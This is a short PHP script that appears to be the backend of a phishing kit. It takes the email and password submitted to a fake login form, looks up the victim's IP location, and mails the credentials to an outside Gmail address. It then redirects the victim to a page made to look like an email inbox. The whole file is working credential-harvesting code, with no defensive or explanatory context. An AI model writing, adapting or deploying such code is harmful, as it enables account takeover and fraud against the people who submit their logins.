<?php
$login = $_POST['frm-email'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ LOGS +=============\n";
$message .= "username: ".$_POST['frm-email']."\n";
$message .= "Password: ".$_POST['frm-pass']."\n";
$message .= "============= [ Loc Info ] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = 'Bless';
$subj = "Logs EN | $login | $geoplugin->countryName";
$from = "From: $domain<west@live.com>\n";
mail("transdeptconsultant@gmail.com",$subj,$message,$from,$domain);

header("Location: l.php?email=$login&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
?>